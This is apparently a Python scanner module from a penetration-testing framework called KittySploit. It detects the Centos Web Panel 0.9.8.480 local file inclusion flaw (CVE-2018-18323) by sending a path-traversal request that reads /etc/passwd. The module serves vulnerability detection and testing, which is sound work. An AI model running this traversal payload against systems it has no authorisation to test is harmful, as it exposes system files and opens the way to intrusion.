#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Centos Web Panel version 0."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Centos Web Panel 0.9.8.480 - Local File Inclusion Detection',
        'description': 'Centos Web Panel version 0.9.8.480 suffers from local file inclusion vulnerabilities. Other vulnerabilities including cross-site scripting and remote code execution are also known to impact this version.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2018', 'centos', 'lfi', 'packetstorm', 'control-webpanel', 'xss', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://packetstormsecurity.com/files/149795/Centos-Web-Panel-0.9.8.480-XSS-LFI-Code-Execution.html',
            'http://centos-webpanel.com/',
            'https://seccops.com/centos-web-panel-0-9-8-480-multiple-vulnerabilities/',
            'https://nvd.nist.gov/vuln/detail/CVE-2018-18323',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2018-18323',
    }

    def run(self):
        r = self.http_request(method="GET", path='/admin/index.php?module=file_editor&file=/../../../../../../../../../../../etc/passwd', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:[x*]:0:0',)
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='high',
                reason="Centos Web Panel 0.9.8.480 - Local File Inclusion detected",
                path='/admin/index.php?module=file_editor&file=/../../../../../../../../../../../etc/passwd',
            )
            return True
        return False

